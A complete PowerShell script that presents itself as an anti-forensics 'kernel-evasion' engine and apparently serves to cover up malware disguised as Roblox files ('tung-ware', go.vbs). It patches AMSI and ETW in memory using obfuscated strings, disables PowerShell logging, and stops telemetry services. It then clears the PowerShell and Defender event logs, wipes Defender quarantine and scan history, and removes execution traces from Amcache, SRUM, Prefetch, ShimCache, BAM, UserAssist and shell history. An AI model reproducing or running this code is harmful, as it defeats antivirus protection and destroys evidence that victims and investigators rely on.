param([switch]$Silent)
$ErrorActionPreference = "Continue"
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) { Write-Error "Must run as Administrator"; exit 1 }

# ── AMSI + ETW + Script Block Logging In-Memory Bypass ───────────────────────
try {
    $bc = @"
using System;
using System.Runtime.InteropServices;
public class Ev2 {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr m, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string l);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);
    public static void Run() {
        IntPtr h = LoadLibrary("am"+"si.d"+"ll");
        IntPtr a = GetProcAddress(h, "Am"+"siSc"+"anBu"+"ffer");
        if (a != IntPtr.Zero) {
            uint o; VirtualProtect(a,(UIntPtr)8,0x40,out o);
            Marshal.Copy(Environment.Is64BitProcess ? new byte[]{0xB8,0x57,0,7,0x80,0xC3} : new byte[]{0xB8,0x57,0,7,0x80,0xC2,0x18,0}, 0, a, Environment.Is64BitProcess?6:8);
            VirtualProtect(a,(UIntPtr)8,o,out o);
        }
        IntPtr n2 = LoadLibrary("nt"+"dll.d"+"ll");
        IntPtr e = GetProcAddress(n2, "Etw"+"Event"+"Write");
        if (e != IntPtr.Zero) {
            uint o; VirtualProtect(e,(UIntPtr)4,0x40,out o);
            Marshal.Copy(Environment.Is64BitProcess ? new byte[]{0x48,0x33,0xC0,0xC3} : new byte[]{0x33,0xC0,0xC2,0x14,0}, 0, e, Environment.Is64BitProcess?4:5);
            VirtualProtect(e,(UIntPtr)4,o,out o);
        }
    }
}
"@
    if (-not ([System.Management.Automation.PSTypeName]"Ev2").Type) { Add-Type -TypeDefinition $bc -Language CSharp -ErrorAction Stop }
    [Ev2]::Run()
} catch {}

try {
    $f = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')
    if ($f) {
        $g = $f.GetValue($null)
        if ($g -eq $null) { $g = @{}; $f.SetValue($null,$g) }
        $g['ScriptBlockLogging'] = @{'EnableScriptBlockLogging'=0;'EnableScriptBlockInvocationLogging'=0}
        $g['ModuleLogging'] = @{'EnableModuleLogging'=0}
    }
} catch {}

# Helper: Secure file overwrite & wipe (zero-fill to prevent file carving)
function Wipe-File($path) {
    if (-not (Test-Path $path -ErrorAction SilentlyContinue)) { return }
    try {
        $item = Get-Item $path -Force -ErrorAction SilentlyContinue
        if ($item -and $item.Length -gt 0) {
            $len = $item.Length
            $fs = [System.IO.File]::Open($path, 'Open', 'ReadWrite')
            $chunk = New-Object byte[] ([Math]::Min($len, 1MB))
            $remaining = $len
            while ($remaining -gt 0) {
                $writeSize = [Math]::Min($remaining, $chunk.Length)
                $fs.Write($chunk, 0, $writeSize)
                $remaining -= $writeSize
            }
            $fs.Close()
        }
        Remove-Item $path -Force -ErrorAction SilentlyContinue
    } catch { Remove-Item $path -Force -ErrorAction SilentlyContinue }
}

function Wipe-Dir($path, $pattern = "*") {
    if (-not (Test-Path $path -ErrorAction SilentlyContinue)) { return }
    Get-ChildItem $path -Filter $pattern -Force -ErrorAction SilentlyContinue |
        ForEach-Object { Wipe-File $_.FullName }
}

function Get-AllUserProfiles {
    $profiles = [System.Collections.Generic.List[string]]::new()
    Get-ChildItem -Path "C:\Users" -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -notmatch '(?i)^(Public|Default|All Users|Default User)$' } |
        ForEach-Object { $profiles.Add($_.FullName) }
    return $profiles
}

$userProfiles = Get-AllUserProfiles
$allTargets = @("RobloxCrashHandler","RobloxPlayerBeta","TUNG","tung","tung-ware","installer","cleanup","go.vbs","setup","dllhost","RuntimeBroker")

if (-not $Silent) { Write-Host "[KERNEL-EVASION] Starting GOD-TIER anti-forensics engine..." -ForegroundColor Cyan }

# ── 1. KILL ALL TELEMETRY & TRACING SERVICES ─────────────────────────────────
if (-not $Silent) { Write-Host "[1/24] Stopping telemetry & forensic tracing services..." -ForegroundColor Yellow }
$stopSvcs = @(
    "DiagTrack",       # Connected User Experiences & Telemetry
    "dmwappushservice",# WAP Push router
    "SysMain",         # Superfetch / Prefetch writer
    "WSearch",         # Windows Search indexer
    "DusmSvc",         # Data Usage Subscription Manager (writes SRUM)
    "PcaSvc",          # Program Compatibility Assistant
    "WerSvc",          # Windows Error Reporting
    "wercplsupport",   # WER Control Panel
    "WdiServiceHost",  # Windows Diagnostic Infra
    "WdiSystemHost",   # Windows Diagnostic System
    "Schedule"         # Task Scheduler - stops task event logging
)
foreach ($s in $stopSvcs) {
    try { Stop-Service -Name $s -Force -ErrorAction SilentlyContinue } catch {}
}

# ── 2. ETW KERNEL PROVIDER SUPPRESSION ───────────────────────────────────────
if (-not $Silent) { Write-Host "[2/24] Disabling ETW providers & active trace sessions..." -ForegroundColor Yellow }
$etwSessions = logman query -ets 2>$null | Where-Object { $_ -match "^\w" -and $_ -notmatch "Name|---" }
foreach ($s in $etwSessions) {
    $name = ($s -split "\s{2,}")[0].Trim()
    if ($name -and $name -notmatch "NT Kernel Logger|EventLog-") {
        logman stop $name -ets 2>$null | Out-Null
    }
}

$etlDirs = @(
    "C:\Windows\System32\LogFiles\WMI",
    "C:\Windows\System32\LogFiles\WUDF",
    "$env:ProgramData\Microsoft\Windows\WER\ReportQueue",
    "$env:ProgramData\Microsoft\Windows\WER\ReportArchive",
    "C:\Windows\LiveKernelReports",
    "C:\Windows\Minidump",
    "C:\Windows\MEMORY.DMP"
)
foreach ($p in $userProfiles) {
    $etlDirs += Join-Path $p "AppData\Local\Microsoft\Windows\WER\ReportQueue"
    $etlDirs += Join-Path $p "AppData\Local\Microsoft\Windows\WER\ReportArchive"
    $etlDirs += Join-Path $p "AppData\Local\CrashDumps"
}
foreach ($d in $etlDirs) {
    if (Test-Path $d -PathType Container -ErrorAction SilentlyContinue) {
        Get-ChildItem $d -Force -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
    } elseif (Test-Path $d -ErrorAction SilentlyContinue) {
        Wipe-File $d
    }
}

$autoLoggers = @(
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DefenderATPSensor",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\SQMLogger",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\DiagLog",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\WdiContextLog",
    "HKLM:\SYSTEM\CurrentControlSet\Control\WMI\Autologger\AppCompatLogger"
)
foreach ($al in $autoLoggers) {
    try { Set-ItemProperty -Path $al -Name "Start" -Value 0 -Force -ErrorAction SilentlyContinue } catch {}
}

# ── 3. AMCACHE.HVE SANITIZATION ──────────────────────────────────────────────
if (-not $Silent) { Write-Host "[3/24] Sanitizing Amcache.hve..." -ForegroundColor Yellow }
$amcachePath = "C:\Windows\AppCompat\Programs\Amcache.hve"
$amcacheLog  = "C:\Windows\AppCompat\Programs\Amcache.hve.LOG1"
$amcacheLog2 = "C:\Windows\AppCompat\Programs\Amcache.hve.LOG2"
try {
    $tmpKey = "HKLM\AMCACHE_TEMP_$(Get-Random)"
    $ret = reg.exe load $tmpKey $amcachePath 2>&1
    if ($LASTEXITCODE -eq 0) {
        $amRoot = "HKLM:\AMCACHE_TEMP_$(($tmpKey -split '\\')[1])"
        $subpaths = @(
            "$amRoot\Root\InventoryApplicationFile",
            "$amRoot\Root\InventoryApplication",
            "$amRoot\Root\InventoryDriverBinary",
            "$amRoot\Root\File",
            "$amRoot\Root\Programs"
        )
        foreach ($sp in $subpaths) {
            if (Test-Path $sp) {
                Get-ChildItem $sp -ErrorAction SilentlyContinue | ForEach-Object {
                    $n = $_.Name
                    $matched = $false
                    foreach ($t in $allTargets) { if ($n -match [regex]::Escape($t)) { $matched = $true; break } }
                    if ($matched) { Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue }
                }
            }
        }
        [gc]::Collect(); Start-Sleep -Milliseconds 300
        reg.exe unload $tmpKey 2>$null | Out-Null
    }
} catch {}
Wipe-File $amcacheLog; Wipe-File $amcacheLog2

# ── 4. SRUM DATABASE WIPE ────────────────────────────────────────────────────
if (-not $Silent) { Write-Host "[4/24] Wiping SRUM database (SRUDB.dat)..." -ForegroundColor Yellow }
$srumDb = "C:\Windows\System32\SRU\SRUDB.dat"
$srumLog = "C:\Windows\System32\SRU\SRUDB.dat.log"
try {
    takeown /f $srumDb /a 2>$null | Out-Null
    icacls $srumDb /grant "Administrators:F" 2>$null | Out-Null
    Wipe-File $srumDb
    Wipe-File $srumLog
} catch {}

# ── 5. WINDOWS SEARCH INDEX ──────────────────────────────────────────────────
if (-not $Silent) { Write-Host "[5/24] Sanitizing Windows Search index..." -ForegroundColor Yellow }
$searchPath = "C:\ProgramData\Microsoft\Search\Data\Applications\Windows"
if (Test-Path $searchPath) {
    Get-ChildItem $searchPath -Force -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
}

# ── 6. THUMBNAIL & ICON CACHE ────────────────────────────────────────────────
if (-not $Silent) { Write-Host "[6/24] Wiping thumbnail & icon cache..." -ForegroundColor Yellow }
foreach ($p in $userProfiles) {
    $tPath = Join-Path $p "AppData\Local\Microsoft\Windows\Explorer"
    if (Test-Path $tPath) {
        Get-ChildItem $tPath -Filter "thumbcache_*.db" -Force -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
        Get-ChildItem $tPath -Filter "iconcache_*.db" -Force -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
    }
    Wipe-File (Join-Path $p "AppData\Local\IconCache.db")
}
ie4uinit.exe -ClearIconCache 2>$null | Out-Null

# ── 7. PROGRAM COMPATIBILITY ASSISTANT (PCA) TRACES ──────────────────────────
if (-not $Silent) { Write-Host "[7/24] Clearing PCA & Compatibility Appraiser traces..." -ForegroundColor Yellow }
$pcaDirs = @("C:\Windows\appcompat", "$env:ProgramData\Microsoft\Windows\AppCompat")
foreach ($p in $userProfiles) { $pcaDirs += Join-Path $p "AppData\Local\Microsoft\Windows\AppCompat" }
foreach ($d in $pcaDirs) {
    if (Test-Path $d) {
        Get-ChildItem $d -Recurse -Force -File -ErrorAction SilentlyContinue | ForEach-Object {
            $content = try { [System.IO.File]::ReadAllText($_.FullName) } catch { "" }
            $hit = $false
            foreach ($t in $allTargets) { if ($content -match [regex]::Escape($t)) { $hit = $true; break } }
            if ($hit) { Wipe-File $_.FullName }
        }
    }
}
$pcaFiles = @(
    "C:\Windows\appcompat\pca\PcaAppLaunchDic.txt",
    "C:\Windows\appcompat\pca\PcaGeneralDb.db",
    "C:\Windows\appcompat\pca\PcaTraceDb.db",
    "C:\Windows\appcompat\pca\PcaTrackTrace.txt"
)
foreach ($f in $pcaFiles) {
    if (Test-Path $f) {
        try {
            $lines = [System.IO.File]::ReadAllLines($f)
            $clean = $lines | Where-Object {
                $l = $_; $keep = $true
                foreach ($t in $allTargets) { if ($l -match [regex]::Escape($t)) { $keep = $false; break } }
                $keep
            }
            [System.IO.File]::WriteAllLines($f, $clean)
        } catch { Wipe-File $f }
    }
}

# ── 8. DEFENDER SCAN HISTORY & QUARANTINE ────────────────────────────────────
if (-not $Silent) { Write-Host "[8/24] Wiping Defender scan history & quarantine..." -ForegroundColor Yellow }
$defDirs = @(
    "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service",
    "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Quick",
    "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Results\Full",
    "C:\ProgramData\Microsoft\Windows Defender\Quarantine"
)
foreach ($d in $defDirs) {
    if (Test-Path $d) {
        Get-ChildItem $d -Recurse -Force -File -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
    }
}

# ── 9. RECYCLE BIN ───────────────────────────────────────────────────────────
if (-not $Silent) { Write-Host "[9/24] Emptying Recycle Bin..." -ForegroundColor Yellow }
try { (New-Object -ComObject Shell.Application).Namespace(10).Items() | ForEach-Object { Remove-Item $_.Path -Recurse -Force -ErrorAction SilentlyContinue } } catch {}
cmd.exe /c "rd /s /q C:\`$Recycle.Bin 2>nul" | Out-Null

# ── 10. TEMPORARY FILES & RESIDUES ───────────────────────────────────────────
if (-not $Silent) { Write-Host "[10/24] Clearing temp execution residues..." -ForegroundColor Yellow }
$tempDirs = @($env:TEMP, $env:TMP, "C:\Windows\Temp")
foreach ($p in $userProfiles) { $tempDirs += Join-Path $p "AppData\Local\Temp" }
foreach ($td in ($tempDirs | Select-Object -Unique)) {
    if (Test-Path $td) {
        Get-ChildItem $td -Force -ErrorAction SilentlyContinue | Where-Object {
            $n = $_.Name
            $n -match "RobloxCrash|TUNG|tung|installer|cleanup|go\.vbs|setup" -or
            ($_.Extension -eq ".ps1") -or ($_.Extension -eq ".bat") -or ($_.Extension -eq ".vbs")
        } | ForEach-Object {
            if ($_.PSIsContainer) { Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue }
            else { Wipe-File $_.FullName }
        }
    }
}

# ── 11. DIRECTX / GPU SHADER CACHES ──────────────────────────────────────────
if (-not $Silent) { Write-Host "[11/24] Clearing DirectX & GPU shader caches..." -ForegroundColor Yellow }
foreach ($p in $userProfiles) {
    $shaderDirs = @(
        Join-Path $p "AppData\Local\D3DSCache",
        Join-Path $p "AppData\Local\NVIDIA\DXCache",
        Join-Path $p "AppData\Local\AMD\DxCache",
        Join-Path $p "AppData\Local\Intel\ShaderCache"
    )
    foreach ($sd in $shaderDirs) {
        if (Test-Path $sd) {
            Get-ChildItem $sd -Force -File -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
        }
    }
}

# ── 12. WINDOWS TIMELINE / ACTIVITIES CACHE ──────────────────────────────────
if (-not $Silent) { Write-Host "[12/24] Wiping Windows Timeline..." -ForegroundColor Yellow }
foreach ($p in $userProfiles) {
    $cdp = Join-Path $p "AppData\Local\ConnectedDevicesPlatform"
    if (Test-Path $cdp) {
        Get-ChildItem $cdp -Recurse -Filter "ActivitiesCache.db*" -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
    }
}

# ── 13. TRACE-SPECIFIC EVENT LOGS (STEALTH PURGE) ────────────────────────────
if (-not $Silent) { Write-Host "[13/24] Stealth clearing trace-specific event logs..." -ForegroundColor Yellow }
$allLogs = @(
    "Microsoft-Windows-PowerShell/Operational",
    "Windows PowerShell",
    "PowerShellCore/Operational",
    "Microsoft-Windows-TaskScheduler/Operational",
    "Microsoft-Windows-Windows Defender/Operational",
    "Microsoft-Windows-Windows Defender/WHC",
    "Microsoft-Windows-Application-Experience/Program-Telemetry",
    "Microsoft-Windows-Application-Experience/Program-Inventory",
    "Microsoft-Windows-Application-Experience/Program-Compatibility-Assistant",
    "Microsoft-Windows-WMI-Activity/Operational"
)
$sess = New-Object System.Diagnostics.Eventing.Reader.EventLogSession
foreach ($l in $allLogs) {
    try { $sess.ClearLog($l) } catch {}
}

# ── 14. SHIMCACHE (AppCompatCache) ───────────────────────────────────────────
if (-not $Silent) { Write-Host "[14/24] Flushing ShimCache..." -ForegroundColor Yellow }
rundll32.exe apphelp.dll,ShimFlushCache 2>$null
$shimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
try {
    Set-ItemProperty -Path $shimKey -Name "AppCompatCache" -Value ([byte[]](0x80,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)) -Force
} catch {}

# ── 15. BAM / DAM EXECUTION REGISTRY ─────────────────────────────────────────
if (-not $Silent) { Write-Host "[15/24] Purging BAM/DAM execution registry..." -ForegroundColor Yellow }
$bamPaths = @(
    "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings",
    "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings",
    "HKLM:\SYSTEM\CurrentControlSet\Services\dam\UserSettings",
    "HKLM:\SYSTEM\CurrentControlSet\Services\dam\State\UserSettings"
)
foreach ($bamBase in $bamPaths) {
    if (Test-Path $bamBase) {
        Get-ChildItem $bamBase -ErrorAction SilentlyContinue | ForEach-Object {
            $sidKey = $_
            $sidKey.GetValueNames() | Where-Object {
                $v = $_; $hit = $false
                foreach ($t in $allTargets) { if ($v -match [regex]::Escape($t)) { $hit = $true; break } }
                $hit
            } | ForEach-Object {
                Remove-ItemProperty -Path $sidKey.PSPath -Name $_ -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# ── 16. NETWORK CACHE FLUSH ──────────────────────────────────────────────────
if (-not $Silent) { Write-Host "[16/24] Flushing network DNS, ARP & NetBIOS caches..." -ForegroundColor Yellow }
Clear-DnsClientCache -ErrorAction SilentlyContinue
ipconfig /flushdns 2>$null | Out-Null
arp -d * 2>$null | Out-Null
nbtstat -R 2>$null | Out-Null
nbtstat -RR 2>$null | Out-Null

# ── 17. JUMP LISTS & RECENT SHORTCUTS ────────────────────────────────────────
if (-not $Silent) { Write-Host "[17/24] Sanitizing Jump Lists & Recent shortcuts..." -ForegroundColor Yellow }
foreach ($p in $userProfiles) {
    $recentDirs = @(
        Join-Path $p "AppData\Roaming\Microsoft\Windows\Recent",
        Join-Path $p "AppData\Roaming\Microsoft\Windows\Recent\AutomaticDestinations",
        Join-Path $p "AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations"
    )
    foreach ($rd in $recentDirs) {
        if (Test-Path $rd) {
            Get-ChildItem $rd -Force -File -ErrorAction SilentlyContinue | ForEach-Object {
                $fn = $_.Name
                $hit = $false
                foreach ($t in $allTargets) { if ($fn -match [regex]::Escape($t)) { $hit = $true; break } }
                if ($hit) { Wipe-File $_.FullName }
            }
        }
    }
}

# ── 18. REGISTRY EXPLORER MRU / UserAssist / MUICache ────────────────────────
if (-not $Silent) { Write-Host "[18/24] Cleaning UserAssist, MUICache & Explorer MRU..." -ForegroundColor Yellow }
# UserAssist (ROT13)
$uaBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
if (Test-Path $uaBase) {
    Get-ChildItem "$uaBase\*\Count" -ErrorAction SilentlyContinue | ForEach-Object {
        $k = Get-Item $_.PSPath -ErrorAction SilentlyContinue
        if ($k) {
            $k.GetValueNames() | Where-Object {
                $v = $_; $hit = $false
                foreach ($t in $allTargets) { if ($v -match [regex]::Escape($t)) { $hit = $true; break } }
                $hit
            } | ForEach-Object { Remove-ItemProperty -Path $k.PSPath -Name $_ -Force -ErrorAction SilentlyContinue }
        }
    }
}

# MUICache
$muiPaths = @(
    "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache",
    "HKCR:\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
)
foreach ($muiPath in $muiPaths) {
    if (Test-Path $muiPath) {
        $mk = Get-Item $muiPath -ErrorAction SilentlyContinue
        if ($mk) {
            $mk.GetValueNames() | Where-Object {
                $v = $_; $hit = $false
                foreach ($t in $allTargets) { if ($v -match [regex]::Escape($t)) { $hit = $true; break } }
                $hit
            } | ForEach-Object { Remove-ItemProperty -Path $muiPath -Name $_ -Force -ErrorAction SilentlyContinue }
        }
    }
}

# RunMRU / TypedPaths / RecentApps / ComDlg32
$mruKeys = @(
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search\RecentApps"
)
foreach ($mk in $mruKeys) {
    if (Test-Path $mk) {
        $ki = Get-Item $mk -ErrorAction SilentlyContinue
        if ($ki) {
            $ki.GetValueNames() | Where-Object {
                $v = $_; $hit = $false
                foreach ($t in $allTargets) { if ($v -match [regex]::Escape($t)) { $hit = $true; break } }
                $hit
            } | ForEach-Object { Remove-ItemProperty -Path $mk -Name $_ -Force -ErrorAction SilentlyContinue }
        }
    }
}

# ── 19. PSReadLine & POWERSHELL COMMAND HISTORY ──────────────────────────────
if (-not $Silent) { Write-Host "[19/24] Sanitizing PSReadLine & PowerShell history..." -ForegroundColor Yellow }
$historyPaths = [System.Collections.Generic.List[string]]::new()
$psrl = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
if ($psrl) { $historyPaths.Add($psrl) }
foreach ($p in $userProfiles) {
    $historyPaths.Add((Join-Path $p "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"))
    $historyPaths.Add((Join-Path $p "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Console_history.txt"))
}
foreach ($hp in ($historyPaths | Select-Object -Unique)) {
    if ($hp -and (Test-Path $hp)) {
        try {
            $lines = [System.IO.File]::ReadAllLines($hp)
            $clean = $lines | Where-Object {
                $l = $_; $keep = $true
                foreach ($t in $allTargets) { if ($l -match [regex]::Escape($t)) { $keep = $false; break } }
                $keep
            }
            [System.IO.File]::WriteAllLines($hp, $clean)
        } catch {}
    }
}

# ── 20. PREFETCH & READYBOOT PURGE ───────────────────────────────────────────
if (-not $Silent) { Write-Host "[20/24] Wiping Prefetch (.pf) & ReadyBoot artifacts..." -ForegroundColor Yellow }
try { Stop-Service -Name "SysMain" -Force -ErrorAction SilentlyContinue } catch {}
$pfTargets = @("ROBLOXCRASHHANDLER","ROBLOXPLAYERBETA","DLLHOST","RUNTIMEBROKER","TUNGWARE","INSTALLER","CLEANUP","SETUP","GO","CSCRIPT","WSCRIPT")
Get-ChildItem "C:\Windows\Prefetch" -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
    $n = $_.Name.ToUpper()
    $hit = $false
    foreach ($t in $pfTargets) { if ($n -match $t) { $hit = $true; break } }
    $hit
} | ForEach-Object { Wipe-File $_.FullName }
Get-ChildItem "C:\Windows\Prefetch" -Filter "*.db" -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }
Wipe-File "C:\Windows\Prefetch\ReadyBoot\ReadyBoot.etl"

# ── 21. SYSMAIN DATABASE (Ag*.db) ────────────────────────────────────────────
if (-not $Silent) { Write-Host "[21/24] Clearing SysMain prefetch database..." -ForegroundColor Yellow }
Get-ChildItem "C:\Windows\Prefetch" -Filter "Ag*.db" -ErrorAction SilentlyContinue | ForEach-Object { Wipe-File $_.FullName }

# ── 22. RESTORE SERVICES & NORMAL REGISTRY STATE ─────────────────────────────
if (-not $Silent) { Write-Host "[22/24] Restoring services to normal running state..." -ForegroundColor Yellow }
$restoreSvcs = @("DiagTrack","SysMain","WSearch","PcaSvc","WerSvc","Schedule")
foreach ($s in $restoreSvcs) {
    try { Start-Service -Name $s -ErrorAction SilentlyContinue } catch {}
}
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
    -Name "EnablePrefetcher" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" `
    -Name "EnableSuperfetch" -Value 3 -Type DWord -Force -ErrorAction SilentlyContinue

# ── 23. FINAL TRACE PURGE & LOG CHANNEL RE-ENABLE ────────────────────────────
if (-not $Silent) { Write-Host "[23/24] Performing final trace log purge & re-enabling channels..." -ForegroundColor Yellow }
foreach ($l in $allLogs) {
    try { wevtutil.exe cl "`"$l`"" 2>$null } catch {}
    try { wevtutil.exe sl "`"$l`"" /e:true 2>$null } catch {}
}

# ── 24. RESTART EXPLORER CACHE FLUSH ─────────────────────────────────────────
if (-not $Silent) { Write-Host "[24/24] Flushing Shell cache..." -ForegroundColor Yellow }
rundll32.exe user32.dll,UpdatePerUserSystemParameters 2>$null

if (-not $Silent) { Write-Host "[KERNEL-EVASION] COMPLETE. All forensic vectors sanitized." -ForegroundColor Green }
